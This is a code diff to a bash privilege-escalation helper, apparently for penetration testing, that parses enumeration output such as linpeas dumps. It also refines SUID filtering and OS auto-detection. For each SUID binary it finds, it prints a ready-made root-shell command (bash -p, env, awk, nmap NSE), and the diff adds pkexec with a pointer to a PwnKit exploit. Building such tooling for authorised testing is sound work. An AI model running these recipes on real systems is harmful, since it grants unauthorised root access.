@@ -866,9 +866,15 @@ parse_linux_output() {
         echo ""
 
         # 2. SUID binaries (filter out standard ones)
+        # Match real SUID listings — an ls -l perms field with the setuid 's'
+        # bit, or a bare absolute path (find -perm -4000 style) — not every line
+        # that merely mentions /usr/bin (PATH entries, process args, file lists).
+        # pkexec is intentionally NOT excluded: PwnKit (CVE-2021-4034) is a top
+        # privesc vector.
         echo "=== SUID BINARIES (non-standard) ==="
-        grep -i "suid\|4000\|/usr/bin/\|/usr/sbin/\|/usr/local/" "$input_file" 2>/dev/null | \
-            grep -vE "mount|umount|su$|ping$|chfn|chsh|newgrp|passwd|gpasswd|pkexec|snap|fusermount|ntfs" | head -20
+        grep -E '[-r][-w][sS][-r][-w][xsS][-r][-w][xtT-]|^[[:space:]]*/[^[:space:]]+$' "$input_file" 2>/dev/null | \
+            grep -E '/usr/|/bin/|/sbin/|/opt/' | \
+            grep -vE '/(mount|umount|su|ping|chfn|chsh|newgrp|passwd|gpasswd|snap|fusermount)( |$)' | head -20
         echo ""
 
         # 3. Capabilities
@@ -988,17 +994,21 @@ parse_linux_output() {
             done <<< "${sudo_entries}"
         fi
 
-        # SUID binaries → exploit commands
+        # SUID binaries → exploit commands. pkexec is kept (PwnKit), not filtered.
         local suid_entries
         suid_entries=$(grep -E '/usr/|/bin/|/sbin/|/opt/' "$quickwins" 2>/dev/null | \
-            grep -vE 'ping$|su$|sudo$|passwd$|newgrp$|chfn$|chsh$|gpasswd$|pkexec$|mount$|umount$')
+            grep -vE '/(ping|su|sudo|passwd|newgrp|chfn|chsh|gpasswd|mount|umount)( |$)')
         if [[ -n "${suid_entries}" ]]; then
             echo "[ SUID BINARIES ]"
             echo "------------------------------------------------------------"
-            while IFS= read -r suid_path; do
+            while IFS= read -r suid_line; do
+                [[ -z "${suid_line}" ]] && continue
+                # Isolate the real binary path on the line — ignore ls -l perms,
+                # owner, size and date columns so the recipe maps to the binary.
+                local suid_path suid_bin
+                suid_path=$(grep -oE '/(usr/(local/)?)?(s?bin|opt)/[^[:space:]:,()]+' <<< "${suid_line}" | head -1)
                 [[ -z "${suid_path}" ]] && continue
-                local suid_bin
-                suid_bin=$(basename "${suid_path}" | awk '{print $1}')
+                suid_bin=$(basename "${suid_path}")
                 echo "# SUID: ${suid_path}"
                 case "${suid_bin}" in
                     bash|sh|dash)   echo "${suid_path} -p" ;;
@@ -1009,6 +1019,7 @@ parse_linux_output() {
                     env)            echo "${suid_path} /bin/bash -p" ;;
                     awk|gawk)       echo "${suid_path} 'BEGIN {system(\"/bin/bash -p\")}'" ;;
                     nmap)           echo "echo 'os.execute(\"/bin/bash -p\")' > /tmp/s.nse && ${suid_path} --script /tmp/s.nse" ;;
+                    pkexec)         echo "# PwnKit (CVE-2021-4034): https://github.com/ly4k/PwnKit — transfer PwnKit and run ./PwnKit" ;;
                     *)              echo "# https://gtfobins.github.io/gtfobins/${suid_bin}/#suid" ;;
                 esac
                 echo ""
@@ -2046,17 +2057,23 @@ main() {
         parse_dir="$PRIVESC_DIR/parsed_$(date +%Y%m%d_%H%M%S)"
         mkdir -p "$parse_dir"
 
-        # Auto-detect OS from file content if not specified
+        # Auto-detect OS from file content if not specified. Score both OSes on
+        # specific markers and pick the higher count — a single stray token
+        # (e.g. winpeas output that mentions "/etc/passwd" in a file search, or
+        # the word "linux") must not flip a Windows dump to Linux.
         if [[ -z "$target_os" ]]; then
-            if grep -qi "linux\|linpeas\|/etc/passwd\|uname" "$parse_file"; then
-                target_os="linux"
-            elif grep -qi "windows\|winpeas\|whoami /priv\|systeminfo" "$parse_file"; then
+            local win_score lin_score
+            win_score=$(grep -ciE 'winpeas|seimpersonate|whoami /priv|systeminfo|program files|hkey_|hklm|microsoft windows|privileges information' "$parse_file" 2>/dev/null)
+            lin_score=$(grep -ciE 'linpeas|/etc/passwd|/etc/shadow|sudo -l|uid=[0-9]|gid=[0-9]|gtfobins|/home/' "$parse_file" 2>/dev/null)
+            if (( win_score > lin_score )); then
                 target_os="windows"
+            elif (( lin_score > win_score )); then
+                target_os="linux"
             else
-                error "Cannot auto-detect OS from file. Use --os linux|windows"
+                error "Cannot auto-detect OS from file (windows=${win_score} linux=${lin_score}). Use --os linux|windows"
                 exit 1
             fi
-            info "Auto-detected OS: $target_os"
+            info "Auto-detected OS: $target_os (windows=${win_score} linux=${lin_score} markers)"
         fi
 
         if [[ "$target_os" == "linux" ]]; then
